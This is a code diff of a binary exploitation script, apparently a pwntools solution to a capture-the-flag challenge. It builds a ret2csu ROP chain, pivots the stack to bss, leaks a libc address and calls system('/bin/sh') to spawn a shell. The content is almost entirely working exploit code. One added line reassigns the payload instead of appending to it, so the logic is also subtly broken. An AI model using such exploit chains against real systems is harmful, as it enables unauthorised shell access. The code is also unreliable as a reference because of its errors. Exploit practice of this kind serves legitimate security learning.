@@ -37,7 +37,7 @@ payload += p64(csu1)
 
 # read(0, bss, 0x150)
 payload += b'C'*0x8
-ppayload += p64(0) #rbx
+payload += p64(0) #rbx
 payload += p64(1) #rbp
 payload += p64(read_got) #r12
 payload += p64(0) #r13->edi
@@ -46,35 +46,32 @@ payload += p64(0x150) #r15->rdx
 payload += p64(csu1)
 
 # rbp->bss : stack pivoting
-payload += b'D'*16
+payload = b'D'*16
 payload += p64(bss)
 payload += b'D'*32
 payload += p64(leave_ret)
 
-
-
+pause()
 p.send(payload)
 
-p.recv(8
-
-write_addr = u64(p.recv(8).ljust(8, '\x00'))
 write_offset = libc.symbols['write']
 system_offset = libc.symbols['system']
+p.recvline()
+write_addr = u64(p.recv(8).ljust(8, '\x00'))
 libc_base = write_addr - write_offset
 
 system_addr = libc_base + system_offset
-binsh = libc_base + list(libc.search('))[0]
+binsh = libc_base + list(libc.search(b'/bin/sh'))[0]
 
 
 # system('/bin/sh')
+payload = b'E'*8
+payload += p64(pop_rdi)
+payload += p64(binsh)
+payload += p64(0x004004c6) #ret sled
+payload += p64(system_addr)
 
-
-
-
-payload = b'A'*0x100
-payload +=
-
-
+pause()
 p.send(payload)
 
 
